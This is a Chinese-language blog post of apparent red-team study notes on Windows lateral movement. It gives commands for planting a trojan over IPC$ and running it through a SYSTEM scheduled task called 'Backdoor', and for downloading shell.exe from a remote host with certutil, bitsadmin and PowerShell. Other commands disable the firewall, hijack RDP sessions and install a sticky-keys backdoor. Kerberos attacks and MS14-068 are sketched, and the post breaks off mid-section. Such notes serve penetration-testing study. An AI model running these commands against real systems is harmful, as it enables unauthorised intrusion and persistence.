

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/blog/img/fluid.png">
  <link rel="icon" href="/blog/img/yankun.jpg">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="yankun">
  <meta name="keywords" content="">
  
    <meta name="description" content="通信与防火墙规则横向移动手法通过网络共享IPC 概念： IPC（Internet Process Connection）是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限,在远程管理计算机和查看计算机的共享资源时使用。  条件：  目标主机开启了IPC连接 目标主机的139和445端口开放 知道目标机器的用户名和明文密码   作用： 利用IPC连">
<meta property="og:type" content="article">
<meta property="og:title" content="内网渗透">
<meta property="og:url" content="https://yankun8.github.io/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/index.html">
<meta property="og:site_name" content="yankun">
<meta property="og:description" content="通信与防火墙规则横向移动手法通过网络共享IPC 概念： IPC（Internet Process Connection）是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限,在远程管理计算机和查看计算机的共享资源时使用。  条件：  目标主机开启了IPC连接 目标主机的139和445端口开放 知道目标机器的用户名和明文密码   作用： 利用IPC连">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://yankun8.github.io/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250420162741515.png">
<meta property="og:image" content="https://yankun8.github.io/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250420155835110.png">
<meta property="og:image" content="https://yankun8.github.io/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250420160027454.png">
<meta property="og:image" content="https://yankun8.github.io/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250420162630911.png">
<meta property="og:image" content="https://yankun8.github.io/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250420212617616.png">
<meta property="og:image" content="https://yankun8.github.io/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250420213337974.png">
<meta property="og:image" content="https://yankun8.github.io/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250424204341033.png">
<meta property="og:image" content="https://yankun8.github.io/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250424204542050.png">
<meta property="og:image" content="https://yankun8.github.io/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250424204743483.png">
<meta property="og:image" content="https://yankun8.github.io/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250423143317831.png">
<meta property="og:image" content="https://yankun8.github.io/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505023055633.png">
<meta property="og:image" content="https://yankun8.github.io/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505024109792.png">
<meta property="og:image" content="https://yankun8.github.io/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505023833245.png">
<meta property="og:image" content="https://yankun8.github.io/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505030638420.png">
<meta property="og:image" content="https://yankun8.github.io/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505030726739.png">
<meta property="og:image" content="https://yankun8.github.io/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505141658876.png">
<meta property="og:image" content="https://yankun8.github.io/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505142501385.png">
<meta property="og:image" content="https://yankun8.github.io/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505142611134.png">
<meta property="og:image" content="https://yankun8.github.io/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505143142932.png">
<meta property="og:image" content="https://yankun8.github.io/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505143423308.png">
<meta property="og:image" content="https://yankun8.github.io/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505143845334.png">
<meta property="og:image" content="https://yankun8.github.io/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505144339555.png">
<meta property="og:image" content="https://yankun8.github.io/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505163414809.png">
<meta property="og:image" content="https://yankun8.github.io/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505163512408.png">
<meta property="og:image" content="https://yankun8.github.io/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505163546387.png">
<meta property="og:image" content="https://yankun8.github.io/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505164039502.png">
<meta property="og:image" content="https://yankun8.github.io/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505164508188.png">
<meta property="og:image" content="https://yankun8.github.io/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505164531855.png">
<meta property="og:image" content="https://yankun8.github.io/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505164913198.png">
<meta property="og:image" content="https://yankun8.github.io/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505165154972.png">
<meta property="og:image" content="https://yankun8.github.io/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505165841717.png">
<meta property="og:image" content="https://yankun8.github.io/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505170705927.png">
<meta property="og:image" content="https://yankun8.github.io/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505170736685.png">
<meta property="article:published_time" content="2025-04-20T13:42:19.367Z">
<meta property="article:modified_time" content="2025-05-05T13:11:25.195Z">
<meta property="article:author" content="yankun">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://yankun8.github.io/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250420162741515.png">
  
  
  
  <title>内网渗透 - yankun</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/blog/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/blog/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/blog/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"yankun8.github.io","root":"/blog/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/blog/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/blog/js/utils.js" ></script>
  <script  src="/blog/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/blog/">
      <strong>yankun&#39;s Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/blog/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/blog/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/blog/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/blog/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/blog/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/blog/img/1.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="内网渗透"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-04-20 21:42" pubdate>
          2025年4月20日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          4.2k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          35 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">内网渗透</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="通信与防火墙规则"><a href="#通信与防火墙规则" class="headerlink" title="通信与防火墙规则"></a>通信与防火墙规则</h1><h1 id="横向移动手法"><a href="#横向移动手法" class="headerlink" title="横向移动手法"></a>横向移动手法</h1><h2 id="通过网络共享"><a href="#通过网络共享" class="headerlink" title="通过网络共享"></a>通过网络共享</h2><h3 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h3><ul>
<li><p>概念：</p>
<p>IPC（Internet Process Connection）是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限,在远程管理计算机和查看计算机的共享资源时使用。</p>
</li>
<li><p>条件：</p>
<ol>
<li>目标主机开启了IPC连接</li>
<li>目标主机的139和445端口开放</li>
<li>知道目标机器的用户名和明文密码</li>
</ol>
</li>
<li><p>作用：</p>
<p>利用IPC连接后可以用于上传木马，查看目标主机的目录结构，使用定时任务来运行木马</p>
</li>
<li><p>使用：</p>
<p>建立IPC连接</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">net use \\192.168.11.11\IPC$ <span class="hljs-string">&quot;密码&quot;</span> /user:<span class="hljs-string">&quot;yankun\administrator&quot;</span><br>net use \\192.168.11.11\IPC$ <span class="hljs-string">&quot;Mim&quot;</span> /user:<span class="hljs-string">&quot;yankun\administrator&quot;</span><br></code></pre></td></tr></table></figure>

<img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250420162741515.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250420162741515">

<p>查看目录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">dir</span> \\192.168.11.11\C$<br></code></pre></td></tr></table></figure>

<img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250420155835110.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250420155835110">

<p>上传木马</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">copy</span> .\<span class="hljs-number">789</span>t.exe \\<span class="hljs-number">192.168.11.11</span>\C$<br></code></pre></td></tr></table></figure>

<img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250420160027454.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250420160027454">

<p>也可以将目标机器的C盘映射到本地</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">net use z: \\192.168.11.11\c$ <span class="hljs-comment">#已经建立了IPC连接</span><br>net use z: \\192.168.11.11\c$ <span class="hljs-string">&quot;密码&quot;</span> /user:<span class="hljs-string">&quot;yankun\administrator&quot;</span><br></code></pre></td></tr></table></figure>

<img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250420162630911.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250420162630911">

<p>创建定时任务运行</p>
<p>由于在2008及以后的系统中已经将at命令废弃，所以只将将schtasks命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /Create /S 192.168.11.11 /TN Backdoor /SC minute /MO 1 /TR C:\789t.exe /RU System /F /U yankun\administrator /P 密码<br><span class="hljs-comment"># /s，指定要连接到的系统</span><br><span class="hljs-comment"># /TN，指定要创建的计划任务名称</span><br><span class="hljs-comment"># /SC，指定计划任务频率</span><br><span class="hljs-comment"># /MO，制定计划任务执行周期</span><br><span class="hljs-comment"># /TR，指定计划任务运行的程序路径</span><br><span class="hljs-comment"># /RU，指定计划任务运行的用户权限</span><br><span class="hljs-comment"># /F，如果指定的任务存在则强制创建</span><br></code></pre></td></tr></table></figure>

<p>检查是否添加成功：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /Query /S 192.168.11.11 /U yankun\administrator /P 密码 | findstr <span class="hljs-string">&quot;Backdoor&quot;</span>#未建立IPC连接，已经建立了IPC连接就不需要输入用户名和密码了<br></code></pre></td></tr></table></figure>

<p>立即启动计划任务，然后就是等待上线了：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /RUN /S 192.168.11.11 /I /TN Backdoor /U yankun\administrator /P 密码#未建立IPC连接<br></code></pre></td></tr></table></figure>

<p>删除计划任务：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /Delete /S 192.168.11.11 /TN Backdoor /F /U yankun\administrator /P 密码#未建立IPC连接<br></code></pre></td></tr></table></figure>

<p>删除IPC连接</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">net use \\192.168.11.11\ipc$ /delete<br>net use * /delete#删除全部连接<br></code></pre></td></tr></table></figure>

<p>impacket工具</p>
</li>
</ul>
<h3 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h3><ul>
<li><p>概念：又称为CIFS（Common Inter File System,网络文件共享系统），由微软开发，基于应用层网络传输协议，SMB一般使用NetBIOS协议或者TCP发送，分别使用端口是139或445，现在常用445端口</p>
</li>
<li><p>作用：使网络上的计算机能够共享文件夹，打印机等等</p>
</li>
<li><p>条件：可以用公网VPS或者本地机器搭建SMB服务器（需要解决通信的问题）就是要让目标机器能够访问到SMB服务器，还有要使用SMB匿名共享</p>
</li>
<li><p>使用：</p>
<p>以linux服务器作为演示</p>
<p>搭建一个名为yankunsmb，共享目录指向<code>/root/share</code>的SMB匿名共享：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> /root/share<br>python3 smbserver.py yankunsmb /root/share -smb2support<br></code></pre></td></tr></table></figure>

<img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250420212617616.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250420212617616">

<p>从SMB Server下载文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">copy  \\172.19.228.211\\yankunsmb\shell.exe shell.exe<br></code></pre></td></tr></table></figure>

<p>上传文件到SMB Server</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">net use z: \\172.19.228.211\yankunsmb <span class="hljs-comment">#将SMB共享文件夹映射到本地的一个网络驱动器 </span><br>copy 1.txt x:<br><br>net use z: /delete<br></code></pre></td></tr></table></figure>

<img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250420213337974.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250420213337974"></li>
</ul>
<h2 id="使用Windows自带工具"><a href="#使用Windows自带工具" class="headerlink" title="使用Windows自带工具"></a>使用Windows自带工具</h2><ol>
<li><p>Certutil</p>
<p>使用方法：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">certutil -urlcache -<span class="hljs-built_in">split</span> -f http://ip:port/shell.exe C:\shell.exe<br></code></pre></td></tr></table></figure>
</li>
<li><p>BITSAdmin</p>
<p>使用方法：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bitsadmin /transfer <span class="hljs-built_in">test</span> http://ip：port/shell.exe C:\shell.exe#创建一个<span class="hljs-built_in">test</span>任务<br></code></pre></td></tr></table></figure>
</li>
<li><p>powershell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Invoke-WebRequest -Uri http://ip:port/shell.exe -OutFile C:\shell.exe<br></code></pre></td></tr></table></figure></li>
</ol>
<h3 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h3><ul>
<li><p>概念：用户可以通过WMI管理本地和远程计算机，Windows为远程传输WMI数据提供了两个可用的协议，分布式组件对象模型DCOM(Distributed Component Object Model)和Windows远程管理(Windows Remote Management)WinRM使得WMI对象的查询，时间注册，WMI类方法的执行和类的创建等操作都能够远程执行</p>
</li>
<li><p>条件：</p>
<ol>
<li>远程主机的WMI服务为开启状态（默认是开启的）</li>
<li>远程主机的防火墙放行135端口（出站协议）</li>
</ol>
</li>
<li><p>作用：</p>
</li>
<li><p>使用：</p>
<p>使用Windows自带的wmic.exe和PowerShell Cmdlet来使用WMI数据和执行WMI方法</p>
<p>执行yuan</p>
</li>
</ul>
<h3 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h3><p>前提是获取了账户的明文密码</p>
<p>远程叫做远程桌面协议（Romte Desktop Protocol），默认是监听3389端口</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"> reg query <span class="hljs-string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> /v fDenyTSConnections  <span class="hljs-comment">#通过查询注册表来查看是否开启了远程桌面，其中0x0为开启，为1则为禁用</span><br></code></pre></td></tr></table></figure>

<img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250424204341033.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250424204341033">

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f  <span class="hljs-comment">#注册表开启3389端口</span><br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netsh advfirewall firewall add rule name=<span class="hljs-string">&quot;Open 3389&quot;</span> <span class="hljs-built_in">dir</span>=<span class="hljs-keyword">in</span> action=allow protocol=TCP localport=3389  <span class="hljs-comment">#添加防火墙规则</span><br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">netsh firewall <span class="hljs-built_in">set</span> opmode <span class="hljs-built_in">disable</span>   			<span class="hljs-comment">#winsows server 2003 之前</span><br>netsh advfirewall <span class="hljs-built_in">set</span> allprofiles state off 	<span class="hljs-comment">#winsows server 2003 之后</span><br></code></pre></td></tr></table></figure>

<p>RDP远程登录前提获取了明文的密码，但是只能获取hash又该怎么办呢？</p>
<p>RDP会话劫持：</p>
<p>条件：</p>
<ul>
<li><p>需要获取了stystem权限（可以使用微软自带工具PSexec提权我没有复线成功就没写了）</p>
</li>
<li><p>主机上还有其他用户的会话</p>
<p>可以使用query user查看</p>
<img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250424204542050.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250424204542050">

<p>低权限劫持高权限不需要密码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sc create rdp binpath= <span class="hljs-string">&quot;cmd.exe /k tscon 1 /dest:console&quot;</span> <span class="hljs-comment">#需要获取到system权限，这个命令就是用sc创建一个system权限运行的cmd服务</span><br></code></pre></td></tr></table></figure>

<img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250424204743483.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250424204743483">

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sc qc rdp     <span class="hljs-comment">#查询服务</span><br>sc start rdp  <span class="hljs-comment">#启动服务</span><br></code></pre></td></tr></table></figure>

<p>配合桌面辅助功能后门利用</p>
<p>就是讲windows一些粘滞键，屏幕键盘，放大镜，屏幕阅读这些快捷键改为cmd.exe（可以配合PSexec来操作）</p>
</li>
</ul>
<h3 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h3><ul>
<li><p>概念：</p>
<p>哈希传递（Pass The Hash，PTH）是一种窃取用户的hash，使用用户hash来验证身份的攻击方法（无需用户的明文密码），但是在 Windows Server 2012 R2之后，lsass.exe进程中抓不到明文密码了。微软为了防止用户密码在内存中以明文形式泄露，发布了补丁KB2871997，关闭了Wdigest功能。使其攻击无法在内存中抓取到明文密码了，并且打了KB2871997补丁，只有sid&#x3D;500（Administrator）才能进行哈希传递攻击，这给我们的难度也大大增加了</p>
</li>
<li><p>原理：</p>
<p>NTLM协议支持通过hash值来确认身份</p>
<p>当用户尝试访问远程系统（SMB、WMI、WinRM）时候，系统会将hash发送给目标服务器验证，所以如果攻击者如果在内存中抓取到用户的NTLM哈希，就可以伪造该用户，直接将hash传给服务器，无需明文密码</p>
</li>
</ul>
<h2 id="Kerberos攻击方法"><a href="#Kerberos攻击方法" class="headerlink" title="Kerberos攻击方法"></a>Kerberos攻击方法</h2><p>域内用户名枚举：<br>原理：通过Kerberos的AS_REQ工作原理进行枚举，由于用户名存在和不存在的报错不一样，由此可以用来枚举用户</p>
<p>密码喷洒</p>
<p>Kerberoasting：</p>
<p>离线破解TGS_REP有服务器的hash加密的ST，破解服务器的密码（本质是依靠字典破解密码）</p>
<p><strong>利用条件：</strong></p>
<p>ASRepRoasting：</p>
<p>离线破解用户密码，通过破解AS_REP的用用户密码派生的密钥加密的会话密钥（Login Session Key）,为什么能够破解用户密码，若用户密码是<code>P@ssw0rd</code>，KDC会用<code>P@ssw0rd</code>派生的密钥加密<code>Login Session Key</code>，攻击者尝试用<code>P@ssw0rd</code>生成密钥解密<code>enc-part</code>，若成功则确认密码正确。</p>
<p><strong>利用条件：</strong></p>
<p>需要开启不需要kerberos预身份验证</p>
<h3 id="MS14-068："><a href="#MS14-068：" class="headerlink" title="MS14-068："></a>MS14-068：</h3><p><strong>漏洞的作用：</strong></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">将普通域用户权限提升为域控权限<br></code></pre></td></tr></table></figure>

<p><strong>漏洞原因：</strong></p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">KDC无法正确校验<span class="hljs-keyword">PAC</span>的签名是否正确<br></code></pre></td></tr></table></figure>

<p><strong>利用条件：</strong></p>
